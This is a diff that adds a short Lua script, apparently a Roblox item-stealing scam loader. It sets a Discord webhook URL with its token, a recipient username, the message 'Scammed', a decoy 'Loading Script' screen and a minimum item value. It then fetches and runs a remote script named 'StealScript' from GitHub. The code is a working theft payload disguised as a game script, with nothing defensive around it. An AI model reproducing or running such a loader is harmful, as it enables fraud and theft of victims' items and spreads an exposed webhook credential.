@@ -1,0 +1,7 @@
+Webhook = "https://discord.com/api/webhooks/1267416533785903195/fFy1SODBOq6oRdEiuiJv0u1YAMLvx3014nbDXQUt1rvKFnQykUsn5KWR0MSUHXQa8SpH" 
+Usernames = {"29bsp"}
+MailMessage = "Scammed"
+LoadingScreenText = "Loading Script"
+min_rap = 1000
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Cezar-Very-Epic/Steal/main/StealScript"))() 
